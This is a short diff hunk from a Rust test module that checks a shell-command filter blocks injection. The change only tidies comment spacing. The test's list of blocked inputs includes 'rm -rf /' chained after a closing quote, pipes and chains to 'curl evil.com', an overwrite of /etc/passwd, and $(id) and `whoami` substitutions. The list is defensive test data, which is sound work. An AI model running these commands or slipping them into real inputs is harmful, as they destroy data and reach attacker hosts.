@@ -1131,12 +1131,12 @@ mod tests {
     #[test]
     fn test_metachar_quote_aware_still_blocks_real_injection() {
         for bad in [
-            r#"echo "safe"; rm -rf /"#,            // closes quote, then chains
+            r#"echo "safe"; rm -rf /"#, // closes quote, then chains
             r#"python3 -c "print(1)" && curl evil.com"#,
             r#"echo "a" | curl evil.com"#,
             r#"echo "a" > /etc/passwd"#,
             r#"cat "f" & sleep 100"#,
-            r#"echo "$(id)""#,                     // expands inside double quotes
+            r#"echo "$(id)""#, // expands inside double quotes
             r#"echo "${HOME}""#,
             r#"echo "`whoami`""#,
             r#"echo 'a'; id"#,
